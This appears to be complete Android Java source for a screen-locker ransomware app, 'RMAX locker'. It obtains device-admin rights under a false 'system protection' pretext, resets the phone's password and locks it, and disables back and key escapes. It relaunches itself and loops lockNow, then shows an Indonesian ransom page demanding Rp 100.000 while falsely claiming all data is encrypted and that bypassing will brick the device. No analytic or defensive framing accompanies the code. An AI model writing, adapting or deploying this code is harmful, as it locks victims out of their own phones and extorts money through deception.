package com.rmax.locker;

import android.app.Activity;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebSettings;

public class MainActivity extends Activity {
    private static final int REQUEST_CODE = 1;
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    private WebView webView;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Hide navigation & status bar - full immersive
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
            WindowManager.LayoutParams.FLAG_FULLSCREEN |
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        );
        
        // Immersive sticky mode - no escape
        getWindow().getDecorView().setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
            View.SYSTEM_UI_FLAG_FULLSCREEN |
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        );
        
        // Setup device admin
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        
        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "Aktivasi diperlukan untuk proteksi sistem");
            startActivityForResult(intent, REQUEST_CODE);
        }
        
        // Reset password to lock device
        if (dpm.isAdminActive(adminComponent)) {
            dpm.resetPassword("666666", 0);
            dpm.lockNow();
        }
        
        // Setup WebView with ransom HTML
        webView = new WebView(this);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setAllowFileAccess(false);
        settings.setAllowContentAccess(false);
        
        String html = getRansomHTML();
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
        
        setContentView(webView);
        
        // Start foreground service to prevent killing
        startService(new Intent(this, LockService.class));
        
        // Continuous lock loop
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(500);
                    if (dpm.isAdminActive(adminComponent)) {
                        runOnUiThread(() -> {
                            moveTaskToBack(false);
                            dpm.lockNow();
                        });
                    }
                } catch (Exception e) {}
            }
        }).start();
    }
    
    private String getRansomHTML() {
        return "<!DOCTYPE html>" +
            "<html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'>" +
            "<style>" +
            "* { margin:0; padding:0; box-sizing:border-box; }" +
            "body { font-family:'Courier New',monospace; background:linear-gradient(135deg,#0a0a0a 0%,#1a0000 100%); " +
            "color:#fff; display:flex; align-items:center; justify-content:center; min-height:100vh; overflow:hidden; }" +
            ".container { text-align:center; padding:20px; max-width:600px; animation:glitch 3s infinite; }" +
            "@keyframes glitch { 0%,100% { transform:translate(0); } " +
            "20% { transform:translate(-2px,2px); } 40% { transform:translate(2px,-2px); } " +
            "60% { transform:translate(-2px,-2px); } 80% { transform:translate(2px,2px); } }" +
            ".skull { font-size:80px; margin-bottom:20px; animation:pulse 2s infinite; }" +
            "@keyframes pulse { 0%,100% { opacity:1; transform:scale(1); } " +
            "50% { opacity:0.7; transform:scale(1.1); } }" +
            "h1 { font-size:48px; color:#ff0000; text-shadow:0 0 20px #ff0000, 0 0 40px #ff0000; " +
            "margin-bottom:30px; letter-spacing:5px; }" +
            ".pin { font-size:60px; color:#00ff00; margin:30px 0; letter-spacing:10px; " +
            "text-shadow:0 0 10px #00ff00; }" +
            ".message { font-size:20px; line-height:1.8; margin:20px 0; color:#ff6b6b; }" +
            ".unlock { background:#ff0000; border:3px solid #fff; color:#fff; padding:15px 40px; " +
            "font-size:24px; font-weight:bold; margin-top:30px; cursor:pointer; " +
            "box-shadow:0 0 20px #ff0000; animation:blink 1s infinite; }" +
            "@keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.5; } }" +
            ".contact { font-size:28px; color:#ffff00; margin-top:30px; font-weight:bold; " +
            "text-shadow:0 0 10px #ffff00; }" +
            ".warning { font-size:16px; color:#ff9900; margin-top:20px; font-style:italic; }" +
            "</style></head><body>" +
            "<div class='container'>" +
            "<div class='skull'>💀☠️💀</div>" +
            "<h1>HACKED BY RMAX</h1>" +
            "<div class='pin'>6 6 6 6 6 6</div>" +
            "<div class='message'>" +
            "📱 Device kamu telah di-lock oleh RMAX<br>" +
            "🔒 Semua data terenkripsi<br>" +
            "⚠️ Jangan coba factory reset = data hilang permanent<br>" +
            "💰 Bayar unlock fee untuk kembalikan akses<br>" +
            "</div>" +
            "<button class='unlock'>🔓 UNLOCK NOW</button>" +
            "<div class='contact'>💸 Transfer Rp 100.000<br>ke 088888</div>" +
            "<div class='warning'>" +
            "⏰ Unlock code akan dikirim setelah pembayaran verified<br>" +
            "🚨 Coba bypass = device brick permanent" +
            "</div>" +
            "</div>" +
            "<script>" +
            "document.querySelector('.unlock').onclick=function(){" +
            "alert('Transfer Rp 100.000 ke 088888\\nKirim bukti transfer untuk unlock code');" +
            "};" +
            "setInterval(function(){" +
            "document.body.style.background=Math.random()>0.5?" +
            "'linear-gradient(135deg,#0a0a0a 0%,#1a0000 100%)':" +
            "'linear-gradient(135deg,#1a0000 0%,#0a0a0a 100%)';" +
            "},2000);" +
            "</script></body></html>";
    }
    
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // Block all keys - no escape
        return true;
    }
    
    @Override
    public void onBackPressed() {
        // Block back button
        moveTaskToBack(false);
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            dpm.lockNow();
        }
    }
    
    @Override
    protected void onPause() {
        super.onPause();
        // Re-lock when activity paused
        if (dpm != null && dpm.isAdminActive(adminComponent)) {
            dpm.lockNow();
        }
    }
    
    @Override
    protected void onStop() {
        super.onStop();
        // Keep bringing to front
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(intent);
    }
    
    public static class AdminReceiver extends DeviceAdminReceiver {
        @Override
        public void onEnabled(Context context, Intent intent) {
            super.onEnabled(context, intent);
        }
        
        @Override
        public CharSequence onDisableRequested(Context context, Intent intent) {
            return "Jangan disable admin - device akan brick!";
        }
        
        @Override
        public void onDisabled(Context context, Intent intent) {
            super.onDisabled(context, intent);
        }
    }
}
